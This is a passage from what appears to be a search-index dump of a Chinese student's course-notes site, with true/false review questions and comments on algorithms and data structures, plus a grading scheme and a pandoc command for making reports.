time.<ul> <li>0-1 \u80cc\u5305\u95ee\u9898\u4e0d\u7b97 P \u7c7b</li> </ul> </li> <li>(F) As we know there is a 2-approximation algorithm for the Vertex Cover problem. Then we must be able to obtain a 2-approximation algortithm for the Clique problem, since the Clique problem can be polynomially reduced to the Vertex Cover problem.<ul> <li>\u5c31\u7b97\u8fd9\u4e24\u4e2a\u95ee\u9898\u53ef\u4ee5\u76f8\u4e92\u5f52\u7ea6\uff0c\u5728\u8ba1\u7b97\u8fd1\u4f3c\u7387\u65f6 Cost \u7684\u53d6\u503c\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u5373\u8bc4\u4ef7\u51c6\u5219\u4e0d\u4e00\u6837</li> </ul> </li> <li>(T) Without any assumptions on the distances, if P != NP, there is no \u03c1-approximation for TSP (Travelling Salesman Problem) for any \u03c1\u22651.<ul> <li>\u8fd9\u9898\u7684\u5173\u952e\u5176\u5b9e\u5728\u7b2c\u4e00\u53e5\u8bdd\uff0c\u5bf9\u8ddd\u79bb\u6ca1\u6709\u4efb\u4f55\u5047\u8bbe\u3002\u5bf9\u4e8e TSP \u95ee\u9898\uff0c\u53ef\u4ee5\u5206\u4e3a\u6ee1\u8db3\u4e09\u89d2\u4e0d\u7b49\u5f0f\u7684 Metric TSP \u548c\u4e0d\u6ee1\u8db3\u4e09\u89d2\u4e0d\u7b49\u5f0f\u7684 General TSP(\u975e\u6b27\u51e0\u91cc\u5f97\u7a7a\u95f4\u3001\u975e\u5bf9\u79f0\u3001\u8d1f\u8fb9\u6743\u3001\u52a8\u6001\u8ddd\u79bb\u7b49)\u3002\u5bf9\u4e8e Metric TSP\uff0c\u7684\u786e\u5b58\u5728\u6700\u5c0f\u751f\u6210\u6811\u6cd5\u5f97\u5230\u8fd1\u4f3c\u6bd4\u4e3a2 \u7684\u8fd1\u4f3c\u7b97\u6cd5\uff0c\u4f46\u662f General TSP \u7684\u67d0\u4e9b\u60c5\u51b5\u4f18\u5316\u95ee\u9898\u548c\u9a8c\u8bc1\u95ee\u9898\u96be\u5ea6\u76f8\u5f53\uff0c\u6ca1\u6709\u591a\u9879\u5f0f\u65f6\u95f4\u7b97\u6cd5\u80fd\u591f\u4fdd\u8bc1\u8fd1\u4f3c\u6bd4</li> </ul> </li> <li>Which one of the following statements is FALSE?<ul> <li>[F] A. A language\u00a0L1\u200b\u00a0is polynomial time transformable to\u00a0L2\u200b\u00a0if there exists a polynomial time function\u00a0f\u00a0such that\u00a0w\u2208L1\u200b\u00a0if\u00a0f(w)\u2208L2\u200b.</li> <li>[T] B. If\u00a0L1\u200b\u2208P\u00a0then\u00a0L1\u200b\u2286NP\u2229\u00a0co-NP.</li> <li>[T] C. L1\u200b\u2264p\u200bL2\u200b\u00a0and\u00a0L2\u200b\u2264p\u200bL3\u200b\u00a0then\u00a0L1\u200b\u2264p\u200bL3\u200b.</li> <li>[T] D. If language\u00a0L1\u200b\u00a0has a polynomial reduction to language\u00a0L2\u200b, then the complement of\u00a0L1\u200b\u00a0has a polynomial reduction to the complement of\u00a0L2\u200b.</li> </ul> </li> </ul>"},{"location":"Courses/DS/ADS/Review/#approximation","title":"Approximation","text":"<ul> <li>(F) There exits an online algorithm for the bin packing problem that uses at most 3/2 the optimal number of bins for an instance<ul> <li>\u5728\u7ebf\u7684\u88c5\u7bb1\u95ee\u9898\u7b97\u6cd5\u7684\u4e0a\u9650\u57fa\u672c\u4e5f\u5c31 1.7 \u4e86...</li> <li>\u7406\u8bba\u8bc1\u660e\uff0c\u5bf9\u4e8eonline\u7b97\u6cd5\uff0c\u603b\u80fd\u6784\u9020\u4e00\u7ec4\u8f93\u5165\u4f7f\u5f97\u88c5\u7bb1\u6570\u81f3\u5c11\u4e3a\u6700\u4f18\u89e3\u7684 5/3 \u500d</li> </ul> </li> <li>(F) Suppose ALG is an\u00a0\\(\\alpha\\)-approximation algorithm for an optimization problem\u00a0\\(\\prod\\)\u00a0whose approximation ratio is tight. Then for every\u00a0\\(\\varepsilon \\gt 0\\)\u00a0there is no\u00a0\\((\\alpha-\\varepsilon)\\)-approximation algorithm for\u00a0\\(\\prod\\)\u00a0unless P = NP. (T/F)<ul> <li>\u5bf9\u4e8e\u4e00\u79cd\u7b97\u6cd5\u800c\u8a00\uff0c\u8fd1\u4f3c\u6bd4\u4e3a\u00a0\\(\\alpha\\)\u00a0\uff0c\u90a3\u4e48\u00a0\u2200\\(\\beta \\gt \\alpha\\)\u00a0\uff0c\u90fd\u53ef\u4ee5\u8bf4\u00a0\\(\\beta\\)\u00a0\u662f\u5176\u8fd1\u4f3c\u6bd4\u3002\u5982\u679c\u00a0\\(\\alpha\\)\u00a0\u662f\u00a0tight\u00a0\u7684\uff0c\u5219\u00a0\\(\\alpha\\)\u00a0\u662f\u4e00\u4e2a\u4e0b\u786e\u754c\u3002</li> <li>\u4f46\u8fd9\u90fd\u53ea\u662f\u5bf9\u8fd9\u4e00\u79cd\u7b97\u6cd5\u7684\u5206\u6790\uff0c\u4e00\u4e2a\u00a0tight\u00a0\u7684\u8fd1\u4f3c\u6bd4\u53ea\u80fd\u8bf4\u660e\u4f60\u5bf9\u8fd9\u79cd\u7b97\u6cd5\u7684\u5206\u6790\u5230\u4f4d\u4e86\uff0c\u800c\u4e0d\u80fd\u8bf4\u660e\u8fd9\u4e2a\u95ee\u9898\u6ca1\u6709\u66f4\u597d\u7684\u7b97\u6cd5\u3002\u8fd9\u91cc\u5b8c\u5168\u662f\u4e24\u7801\u4e8b\u3002</li> </ul> </li> <li>(F) As we know there is a 2-approximation algorithm for the Vertex Cover problem. Then we must be able to obtain a 2-approximation algorithm for the Clique problem, since the Clique problem can be polynomially reduced to the Vertex Cover problem.<ul> <li>\u5173\u4e8e Cost \u7684\u8861\u91cf\u6807\u51c6\u4e0d\u4e00\u6837</li> <li></li> </ul> </li> <li>\u618b\u618b\uff0c\u8fd9\u4e5f\u592a\u96be\u4e86\uff0c\u8003\u8bd5\u7684\u65f6\u5019\u4e5f\u4e0d\u4f1a\u6709\u65f6\u95f4\u60f3<ul> <li>\u9898\u76ee\u7684\u610f\u601d\u662f\uff0c\u5982\u679c\u628a\u6bcf\u4e2a\u70b9\u6700\u5927\u6743\u503c\u7684\u8fb9\u52a0\u5165\u4e00\u4e2a\u96c6\u5408\uff0c\u90a3\u4e48\u8fd9\u4e2a\u96c6\u5408\u7684\u6743\u503c\u548c\u6700\u5927\u751f\u6210\u6811\u6743\u503c\u4e4b\u6bd4\u662f\u591a\u5c11\u3002</li> <li></li> </ul> </li> <li>\u904d\u5386\u6700\u5c0f\u751f\u6210\u6811\uff0c\u56de\u6eaf\u7684\u65f6\u5019\u53ef\u80fd\u4f1a\u628a\u4e00\u6761\u8fb9\u8d70\u4e24\u6b21(\u4e5f\u53ef\u4ee5\u7406\u89e3\u6210\u4e24\u70b9\u4e4b\u95f4\u76f4\u7ebf\u6700\u77ed)\uff0c\u6240\u4ee5\u8be5\u7b97\u6cd5\u8fd1\u4f3c\u6bd4\u4e3a2\u3002\u4f46\u662f\u5982\u679c\u7528\u5c42\u5e8f\u904d\u5386\uff0c\u5c31\u5b8c\u5168\u4e0d\u8d70\u51c6\u786e\u89e3\u7684\u6700\u5c0f\u751f\u6210\u6811\u7684\u8fb9\u4e86\u3002<ul> <li></li> </ul> </li> <li>(F) In the bin packing problem, we are asked to pack a list of items L to the minimum number of bins of capacity 1. For the instance L, let FF(L) denote the number of bins used by the algorithm First Fit. The instance L\u2032is derived from L by deleting one item from L. Then FF(L\u2032) is at most of FF(L).<ul> <li>\u8bf4\u662f\u53ef\u4ee5\u4e3e\u51fa\u53cd\u4f8b\uff0c\u4f46\u6211\u60f3\u4e0d\u5230</li> <li>\u6539\u6210 NF \u7b97\u6cd5\u5219\u662f\u6b63\u786e\u7684</li> </ul> </li> <li>(T) For any undirected graph\u00a0G, the weight of its maximum cut is at least half of the total edge weight.</li> <li>(T) Consider the following variant of the knapsack problem. You are given\u00a0k\u00a0identical knapsacks and\u00a0n\u00a0items of different sizes. The profit of each item is equal to its size. Your goal is to select items and fill the knapsacks as much as possible subject to the capacity constraints. A greedy approach always packs the largest remaining item as long as there is enough room. As bin packing, if more than one knapsacks have room for the current item, one may use any packing rule (Next Fit, First Fit, and Best Fit). No matter what rule you apply, for any\u00a0k\u22651, the approximation ratio of the greedy algorithm is always 2.<ul> <li>\u8fd1\u4f3c\u6bd4\u4e25\u683c\u6765\u8bb2\u90fd\u662f\u5c0f\u4e8e 2 \u7684\uff0c\u4f46\u662f\u8fd9\u662f\u4e0a\u9650\u5c31\u53ef\u4ee5\u4e86</li> </ul> </li> </ul>"},{"location":"Courses/DS/ADS/Review/#local-search","title":"Local Search","text":"<ul> <li>(T) Consider a state-flipping algorithm for the Maximum-Cut problem. We say that partitions\u00a0(A,B)\u00a0and\u00a0(A\u2032,B\u2032)\u00a0are neighbors under the\u00a0k-flip rule if\u00a0(A\u2032,B\u2032)\u00a0can be obtained from\u00a0(A,B)\u00a0by moving at most\u00a0k\u00a0nodes from one side of the partition to the other. If\u00a0(A,B)\u00a0is a local optimum under the\u00a0p-flip rule, it is also a local optimum under the\u00a0k-flip rule for every\u00a0k&lt;p.<ul> <li>\u795e\u79d8\u9898\u76ee\uff0c\u4e0d\u6e05\u695a\u5bf9\u5728\u54ea\u91cc</li> </ul> </li> <li>(F) For an optimization problem, given a neighborhood, if its local optimum is also a global optimum, one can reach an optimal solution with just one step of local improvements.<ul> <li>\u795e\u79d8\u9898\u76ee\uff0c\u4e0d\u6e05\u695a\u9519\u5728\u54ea\u91cc</li> </ul> </li> <li>\u7528 Local Search \u6c42\u89e3 K-center \u7684\u8fd1\u4f3c\u6bd4\u53ef\u4ee5\u662f 2 \u5417\uff1f\uff1f\uff1f\u5e76\u4e0d\u80fd\uff0c\u53ef\u4ee5\u4e3e\u51fa\u53cd\u4f8b\u3002<ul> <li></li> </ul> </li> <li>(T) Local search algorithm can be used to solve lots of classic problems, such as SAT and N-Queen problems. Define the configuration of SAT to be X = vector of assignments of N boolean variables, and that of N-Queen to be Y = positions of the N queens in each column. The sizes of the search spaces of SAT and N-Queen are \\(O(2^N)\\) and \\(O(N^N)\\), respectively.<ul> <li>Search Space \u5c31\u662f\u6240\u6709\u60c5\u51b5\uff0c\u5176\u4e2d SAT \u6307\u7684\u662f\u5e03\u5c14\u53ef\u6ee1\u8db3\u6027\u95ee\u9898</li> </ul> </li> <li>\u795e\u79d8\u9898\u76ee\u3002\u4ece\u52bf\u80fd\u51fd\u6570\u4e0a\u8003\u8651\uff0c\u53ea\u6709\u6700\u5c0f\u751f\u6210\u6811\u95ee\u9898\u7684 cost \u51fd\u6570\u53ea\u6709\u4e00\u4e2a\u6781\u5c0f\u503c\u7684\uff0c\u6240\u4ee5\u4e0d\u4f1a\u9677\u5165\u5c40\u90e8\u6700\u4f18\u89e3<ul> <li></li> <li></li> </ul> </li> <li>(F) A Las Vegas algorithm is a randomized algorithm that always gives the correct result, however the runtime of a Las Vegas algorithm differs depending on the input. A Monte Carlo algorithm is a randomized algorithm whose output may be incorrect with a certain (typically small) probability. The running time for the algorithm is fixed however. Then if a Monte Carlo algorithm runs in O(n^2) time, with the probability 50% of producing a correct solution, then there must be a Las Vegas algorithm that can get a solution in O(n^2) time in expectation.</li> </ul>"},{"location":"Courses/DS/ADS/Review/#randomized-algorithms","title":"Randomized Algorithms","text":"<ul> <li>(F) Considering the randomized quicksort, there exists some good inputs on which the expected running time of randomized quicksort is \\(O(n)\\) where n is the input size. <ul> <li>Randomized Quicksort\u968f\u673a\u5316\u7684\u601d\u60f3\u5c31\u662f\u4fdd\u8bc1\u65f6\u95f4\u590d\u6742\u5ea6\u4e0d\u53d7\u8f93\u5165\u5e8f\u5217\u7684\u5f71\u54cd\uff0c\u56e0\u6b64\u8fd9\u867d\u7136\u4fdd\u8bc1\u4e86\u4e0a\u9650\u4e0d\u4f1a\u8fbe\u5230 \\(O(n^2)\\) \uff0c\u4e5f\u4f7f\u5f97\u4e0b\u9650\u540c\u6837\u4e0d\u4f1a\u8fbe\u5230 \\(O(n)\\)</li> </ul> </li> </ul>"},{"location":"Courses/DS/ADS/Review/#parallel-algorithms","title":"Parallel Algorithms","text":"<ul> <li>Consider two disjoint sorted arrays\u00a0\\(A[1\u2026n]\\)\u00a0and\u00a0\\(B[1\u2026m]\\), we would like to compute the\u00a0k-th smallest element in the union of the two arrays, where\u00a0\\(k\u2264\\min (\u2061m,n)\\). Please choose the smallest possible running time among the following options:<ul> <li>A. \\(O(\\log n)\\)</li> <li>B. \\(\\min (O(\\log m), O(\\log n))\\)</li> <li>C. \\(O(\\log m)\\)</li> <li>D. \\(O(\\log k)\\)</li> <li>\u7b54\u6848\u9009D\uff0c\u56e0\u4e3a\u4e24\u4e2a\u5e76\u67e5\u96c6\u90fd\u662f\u6709\u5e8f\u7684\uff0c\u6240\u6709\u6700\u540e\u641c\u7d22\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u5e94\u8be5\u4e0e \\(m,n\\) \u65e0\u5173</li> <li>https://leetcode.cn/problems/median-of-two-sorted-arrays/solutions/258842/xun-zhao-liang-ge-you-xu-shu-zu-de-zhong-wei-s-114/</li> <li>\u5b9e\u9645\u4e0a\u5c31\u662f\u4e24\u4e2a\u6709\u5e8f\u6570\u7ec4\u7684\u4e8c\u5206\u67e5\u627e\uff0c\u7b2c\u4e00\u6b65\u82e5\u6709\uff1a \\(A[k / 2] \\le B[ k / 2]\\) \uff0c\u5219\u7b2c k \u5c0f\u7684\u5143\u7d20\u4e00\u5b9a\u843d\u5728 \\(A\\) \u6570\u7ec4 \\(k/2\\) \u4e4b\u540e\u6216\u8005 \\(B\\) \u6570\u7ec4 \\(k/2\\) \u4e4b\u524d\u3002\u7ee7\u7eed\u4e8c\u5206\uff0c\u5728\u8fd9\u4e2a\u7f29\u5c0f\u7684\u533a\u95f4\u5185\u67e5\u627e\uff1a \\(A[3k / 4] , B[k / 4]\\) \uff0c\u4ee5\u6b64\u7c7b\u63a8</li> </ul> </li> <li>(F) If we translate a serial algorithm into a reasonably efficient parallel algorithm, the work load and the worst-case running time are usually reduced.</li> <li>(F) When we solve the summation problem via designing the parallel algorithms, we shorten the asymptotic time complexity but take more asymptotic work loads comparing with the sequential algorithms.<ul> <li>\u4f3c\u4e4e\u662f workload \u7684\u7ea7\u522b\u6ca1\u6709\u964d\u4f4e</li> </ul> </li> </ul>"},{"location":"Courses/DS/ADS/Review/#external-sort","title":"External Sort","text":"<ul> <li>(T) If only one tape drive is available to perform the external sorting, then the tape access time for any algorithm will be \\(\\Omega (N^2)\\).<ul> <li>\u8bf4\u662f\u5bfb\u9053\u65f6\u95f4\u4ece \\(O(1)\\) \u53d8\u6210\u4e86 \\(O(n)\\) \u4e86\uff0c\u4f46\u6211\u4e0d\u662f\u5f88\u7406\u89e3</li> </ul> </li> <li>(D) Suppose we have the internal memory that can handle 12 numbers at a time, and the following two runs on the tapes:<ul> <li>Run 1: 1, 3, 5, 7, 8, 9, 10, 12</li> <li>Run 2: 2, 4, 6, 15, 20, 25, 30, 32</li> <li>Use 2-way merge with 4 input buffers and 2 output buffers for parallel operations. Which of the following three operations are NOT done in parallel?</li> <li>A. 1 and 2 are written onto the third tape; 3 and 4 are merged into an output buffer; 6 and 15 are read into an input buffer</li> <li>B. 3 and 4 are written onto the third tape; 5 and 6 are merged into an output buffer; 8 and 9 are read into an input buffer</li> <li>C. 5 and 6 are written onto the third tape; 7 and 8 are merged into an output buffer; 20 and 25 are read into an input buffer</li> <li>D. 7 and 8 are written onto the third tape; 9 and 15 are merged into an output buffer; 10 and 12 are read into an input buffer<ul> <li>\u8fd9\u91cc\u5e94\u8be5\u662f 9 \u548c 10 \u5728\u5408\u5e76\u5e76\u8f93\u51fa\u5230 buffer \u4e0a\u300210 \u548c 12 \u6b63\u5728\u8bfb\u5165 buffer \u8fc7\u7a0b\u4e2d\uff0c\u90a3\u4e48\u5904\u7406\u5668\u5c31\u8981\u7b49\u5f85\u8bfb\u53d6\u8fd9\u4e2a\u8fc7\u7a0b\u5b8c\u6210\u624d\u80fd\u8fdb\u884c\u4e0b\u4e00\u6b65</li> </ul> </li> <li></li> </ul> </li> </ul>"},{"location":"Courses/DS/FDS/","title":"index","text":""},{"location":"Courses/DS/FDS/#index","title":"index","text":"<p> \u7ea6 140 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>\u5e73\u65f6\u5206\u62ff\u5168\uff0c\u6ee1\u7ee9\u5f88\u7b80\u5355\u7684\u4e00\u95e8\u8bfe</p> <p>ADT : The Abbreviation of Abstract Data Type</p>"},{"location":"Courses/DS/FDS/#_1","title":"\u8bc4\u5206\u6807\u51c6","text":"<ul> <li>\u65e5\u5e38\u4f5c\u4e1a 10%</li> <li>\u4e24\u6b21\u5c0f\u6d4b 10%</li> <li>\u671f\u4e2d\u8003\u8bd5 15%</li> <li>\u4e24\u4e2a Bonus \u9898\u76ee 4%</li> <li>\u4e09\u4e2a Project 25/30%<ul> <li>\u9009 Hard \u624d\u67095\u5206\u4e0a\u9650\u52a0\u5206\uff0c\u4f46\u662f\u4e0a\u9762\u6240\u6709\u5206\u6570\u5408\u8d77\u6765\u4e0d\u8d85\u8fc7 60% (\u5e73\u65f6\u5206)</li> </ul> </li> <li>\u671f\u672b\u8003\u8bd5 40%</li> </ul> <p>\u671f\u672b\u8003\u8bd5\u53ef\u4ee5\u8986\u76d6\u671f\u4e2d\u8003\u8bd5\u6210\u7ee9</p>"},{"location":"Courses/DS/FDS/#pandoc","title":"Pandoc","text":"<p>\u4f7f\u7528 pandoc \u5236\u4f5c\u5b9e\u9a8c\u62a5\u544a\uff1a</p> <pre><code>pandoc .\\Project.md -s --highlight-style tango -o pr.pdf \uff08--pdf-engine=xelatex\uff09\n</code></pre> <p>\u5982\u679c\u9700\u8981pandoc\u8f6c\u6362\u4e2d\u6587\u5b57\u7b26\uff0c\u8bf7\u5728 md \u6587\u4ef6\u5f00\u5934\u52a0\u5165:</p> <pre><code>---\ndocumentclass:\n    - ctexart\n---\n</code></pre>"},{"location":"Courses/DS/FDS/%E4%B8%80%E4%BA%9B%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE/","title":"\u9898\u76ee","text":""},{"location":"Courses/DS/FDS/%E4%B8%80%E4%BA%9B%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE/#_1","title":"\u4e00\u4e9b\u7ecf\u5178\u9898\u76ee","text":"<p> \u7ea6 2033 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 10 \u5206\u949f</p>"},{"location":"Courses/DS/FDS/%E4%B8%80%E4%BA%9B%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE/#1","title":"1. \u7b97\u6cd5\u5206\u6790","text":"<ul> <li>\\(Nlog N^2\u548cNlog N^3\\)\u5177\u6709\u76f8\u540c\u7684\u589e\u52a0\u901f\u5ea6<ul> <li></li> </ul> </li> <li>\u6590\u6ce2\u90a3\u5951\u6570\u5217\u9012\u5f52\u7248\u672c\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a\\(O(F_N)\\)\uff0c\u7a7a\u95f4\u590d\u6742\u5ea6\u4e3a\\(O(N)\\)\uff1b\u8fed\u4ee3\u7248\u672c\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a\\(O(N)\\)\uff0c\u7a7a\u95f4\u590d\u6742\u5ea6\u4e3a\\(O(1)\\)</li> <li>\u4e3b\u5b9a\u7406\uff1a<ul> <li></li> </ul> </li> </ul> <p>\u6709\u4e3b\u5b9a\u7406\u5982\u4e0b\uff1a</p> \\[\\begin{gather}T(N)=aT(\\frac{N }{b})+\\Theta(N^k \\log^pN),a\\ge 1,b\\gt 1 ,p\\ge 0 \\\\ T(N)=\\begin{cases}O(N^{\\log_ba})\\ , &amp; if\\ \\log_ba\\gt k \\\\ O(N^k\\log ^{p+1}N)\\ , &amp;if\\ \\log_ba=k \\\\  O(N^k \\log ^pN)\\ , &amp; if\\ log_ba\\lt k \\end{cases} \\end{gather}\\]"},{"location":"Courses/DS/FDS/%E4%B8%80%E4%BA%9B%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE/#_2","title":"\u5b9a\u4e49\u8865\u5145","text":"<ul> <li>\\(T(N)=O(f(N))\\ \\Rightarrow\\)  \u5982\u679c\u5b58\u5728\u5e38\u6570\\(c\\)\u548c\\(n_0\\)\uff0c\u4f7f\u5f97\u5f53\\(N\\ge n_0\\)\u65f6\uff0c\\(T(N)\\le cf(N)\\)\uff0c\u5373T(N)\u589e\u957f\u6bd4f(N) \u6162 \u6216 \u76f8\u540c</li> <li>\\(T(N)=\\Omega (f(N))\\ \\Rightarrow\\) \u5982\u679c\u5b58\u5728\u5e38\u6570\\(c\\)\u548c\\(n_0\\)\uff0c\u4f7f\u5f97\u5f53\\(N\\ge n_0\\)\u65f6\uff0c\\(T(N)\\ge cf(N)\\)\uff0c\u5373T(N)\u589e\u957f\u6bd4f(N) \u5feb \u6216 \u76f8\u540c</li> <li>\\(T(N)=\\Theta(f(N))\\ \\Rightarrow\\) \u5f53\u4e14\u4ec5\u5f53 \\(T(N)=O(f(N))\\) \u4e14 \\(T(N)=\\Omega (f(N))\\) ,\u5373T(N)\u4e0ef(N)\u589e\u957f\u901f\u5ea6\u76f8\u540c</li> <li>\\(T(N)=o(f(N))\\ \\Rightarrow\\) \\(T(N)=O(f(N))\\) \u4e14 \\(T(N)\\ne\\Theta(f(N))\\)\uff0c\u5373T(N)\u589e\u957f\u6bd4f(N) \u6162</li> <li>\\(T(N)=\\omega(f(N))\\ \\Rightarrow\\) \\(T(N)=\\Omega (f(N))\\) \u4e14 \\(T(N)\\ne\\Theta(f(N))\\)\uff0c\u5373T(N)\u589e\u957f\u6bd4f(N) \u5feb</li> </ul> <p>\u6ce8\u610f\u9636\u4e58\u589e\u957f\u901f\u5ea6\u6bd4\u6307\u6570\u51fd\u6570\u5927\uff1a \\(2^n=O(n!)\\)</p>"},{"location":"Courses/DS/FDS/%E4%B8%80%E4%BA%9B%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE/#2","title":"2. \u7ebf\u6027\u8868","text":"<ul> <li>To merge two singly linked ascending lists, both with\u00a0N\u00a0nodes, into one singly linked ascending list, the minimum possible number of comparisons is: N<ul> <li>\u6700\u5c11\u7684\u60c5\u51b5\u53ef\u4ee5\u5047\u8bbe\u7b2c\u4e00\u4e2a\u94fe\u8868\u4e3a{1\uff0c2\uff0c3\uff0c4\uff0c5}\uff0c\u7b2c\u4e8c\u4e2a\u94fe\u8868\u4e3a{6\uff0c7\uff0c8\uff0c9\uff0c10}\u3002\u6b64\u65f6\u53ea\u7528\u5c066\u548c1-5\u5206\u522b\u6bd4\u8f83\u4e00\u6b21\u5373\u53ef\uff0c\u56e0\u6b64\u6700\u5c11\u9700\u8981\u6bd4\u8f83N\u6b21\u3002</li> <li>\u9700\u8981\u6ce8\u610f\uff0cmerge\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u662f\\(O(M+N)\\)</li> </ul> </li> <li>\u5224\u65ad\u5faa\u73af\u961f\u5217\u4e3a\u7a7a\u7684\u6761\u4ef6\u662f <code>Q.front==Q.rear</code> \uff0c\u5224\u65ad\u4e3a\u6ee1\u7684\u6761\u4ef6\u662f <code>Q.front==(Q.rear+1)%Q.size</code></li> <li><ul> <li>\u95ee\u7684\u662f rear element \u800c\u4e0d\u662f rear position , rear\u4e00\u822c\u6307\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u7684\u4e0b\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u6240\u4ee5\u8981\u51cf\u4e00</li> </ul> </li> </ul>"},{"location":"Courses/DS/FDS/%E4%B8%80%E4%BA%9B%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE/#3","title":"3. \u5806","text":"<ul> <li>\u7ebf\u6027\u7b97\u6cd5\u5efa\u5806<ul> <li></li> <li>Linear algorithm \uff0c \u610f\u5473\u7740\u6211\u4eec\u8981\u7528\u8c03\u6574\u5efa\u5806\u6cd5O(N) \u800c\u4e0d\u662f\u4e0d\u65ad\u63d2\u5165\u5efa\u5806O(NlogN)</li> <li>\u5177\u4f53\u800c\u8a00\uff0c\u5c31\u662f\u5148\u65e0\u8111\u653e\u5165\u6811\u4e2d\uff0c\u7136\u540e\u4ece\u5012\u6570\u7b2c\u4e8c\u6392\u6700\u540e\u4e00\u4e2a\u6709\u5b50\u8282\u70b9\u7684\u8282\u70b9\uff08n/2\uff09\u5f00\u59cbshiftdown\uff0c\u5177\u4f53\u8fc7\u7a0b\u7701\u7565\u3002</li> <li></li> </ul> </li> <li>\u6700\u5927\u5806\u7684\u6700\u5c0f\u503c\u5728\u6ca1\u6709\u5b69\u5b50\u7684\u8282\u70b9\u4e2d<ul> <li></li> <li>\u5176\u4e2d\\(\\lfloor \\frac{n}{2} \\rfloor\\)\u662f\u6700\u540e\u4e00\u4e2a\u8282\u70b9\u7684\u7236\u4eb2\uff0c\u56e0\u6b64\u552f\u4e00\u6709\u53ef\u80fd\u7684\u662f\u5927\u4e8en/2\u7684index</li> </ul> </li> <li>(True) The worst-case runtime complexity of finding the largest element in a min-heap with \\(N\\) elements is \\(O(N)\\) <ul> <li>\u6700\u5927\u7684\u5143\u7d20\u53ea\u4f1a\u51fa\u73b0\u5728\u53f6\u8282\u70b9\uff0c\u5373 N/2 \u5230 N \u7684\u8303\u56f4\u5185</li> </ul> </li> <li>(Answer : 4) \u5bf9\u56db\u4e2a\u5143\u7d20\u4f7f\u7528\\(O(N)\\)\u5efa\u5806\u65b9\u6cd5\uff0c\u6700\u591a\u9700\u8981\u6bd4\u8f83\u591a\u5c11\u6b21<ul> <li></li> <li>\u7b2c\u4e00\u8f6e\u53ea\u6bd4\u8f83\u5de6\u5b50\u6811\u4e24\u4e2a\u5143\u7d20\uff0c\u7b2c\u4e8c\u8f6e\u8981\u5148\u6bd4\u8f83\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\u548c\u7b2c\u4e8c\u4e2a\u5b50\u8282\u70b9\u7684\u5927\u5c0f\uff0c\u518d\u5c06\u5176\u4e2d\u5927\u7684\u90a3\u4e2a\u4e0e\u6839\u8282\u70b9\u6bd4\u8f83</li> <li>\u5982\u679c\u6839\u8282\u70b9\u6839\u5de6\u5b50\u8282\u70b9\u4ea4\u6362\u4e86\uff0c\u90a3\u4e48\u5b83\u8fd8\u9700\u8981\u9012\u5f52\u68c0\u9a8c\uff0c\u548c\u5de6\u4e0b\u5b50\u8282\u70b9\u518d\u8fdb\u884c\u6bd4\u8f83</li> </ul> </li> </ul>"},{"location":"Courses/DS/FDS/%E4%B8%80%E4%BA%9B%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE/#4","title":"4. \u6811","text":"<ul> <li>(False) \u4e8c\u53c9\u6811\u4e0e\u5ea6\u4e3a2\u7684\u6811\u76f8\u540c<ul> <li>\u5ea6\u4e3a2\u7684\u6811\u8981\u6c42\u6bcf\u4e2a\u8282\u70b9\u6700\u591a\u53ea\u80fd\u6709\u4e24\u68f5\u5b50\u6811\uff0c\u5e76\u4e14\u81f3\u5c11\u6709\u4e00\u4e2a\u8282\u70b9\u6709\u4e24\u68f5\u5b50\u6811\u3002\u4e8c\u53c9\u6811\u7684\u8981\u6c42\u662f\u5ea6\u4e0d\u8d85\u8fc72\uff0c\u8282\u70b9\u6700\u591a\u6709\u4e24\u4e2a\u53c9\uff0c\u53ef\u4ee5\u662f1\u6216\u80050\uff1b\u4e14\u4e8c\u53c9\u6811\u7684\u5de6\u53f3\u5b50\u6811\u4e0d\u80fd\u968f\u610f\u98a0\u5012\uff0c\u666e\u901a\u6811\u7684\u5b50\u6811\u6ca1\u6709\u5de6\u53f3\u4e4b\u5206\u3002</li> </ul> </li> <li>(False) \u4e8c\u53c9\u641c\u7d22\u6811\u7684\u67e5\u627e\u548cBinary Search\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u76f8\u540c<ul> <li>\u53ea\u6709\u5e73\u8861\u7684\u4e8c\u53c9\u641c\u7d22\u6811\u624d\u4e0e\u6298\u534a\u67e5\u627e\u65f6\u95f4\u590d\u6742\u5ea6\u76f8\u540c</li> </ul> </li> <li>(False) \u4e8c\u53c9\u641c\u7d22\u6811\u7684\u6700\u5c0f\u5143\u7d20\u4e00\u5b9a\u4f4d\u4e8e\u6811\u6839\u7684\u5de6\u5b50\u6811<ul> <li>\u8fd8\u6709\u53ef\u80fd\u662f\u6839\u8282\u70b9</li> </ul> </li> <li>\u4efb\u4f55\u4e8c\u53c9\u6811\u4e2d\uff0cNULL\u6307\u9488\u4e2a\u6570\u6bd4\u5b9e\u9645\u6307\u9488\u4e2a\u6570\u591a<ul> <li></li> <li>\u6709N+1\u4e2aNULL\u6307\u9488\uff0cN-1\u4e2a\u975eNULL\u6307\u9488</li> </ul> </li> <li>\u5c06\u4e00\u4e2ageneral tree \\(T\\) \u8f6c\u6362\u6210 binary tree \\(BT\\) \uff0c\u5219 \\(T\\) \u7684\u540e\u5e8f\u904d\u5386\u4e0e\\(BT\\)\u7684\u4e2d\u5e8f\u904d\u5386\u76f8\u540c\uff0c\u4e14\u4e8c\u8005\u524d\u5e8f\u904d\u5386\u76f8\u540c</li> <li>\u65e0\u8bba\u662f\u524d\u5e8f\u4e2d\u5e8f\u8fd8\u662f\u540e\u5e8f\uff0c\u53f6\u5b50\u8282\u70b9\u7684\u904d\u5386\u987a\u5e8f\u4e0d\u53d8</li> <li>(False) 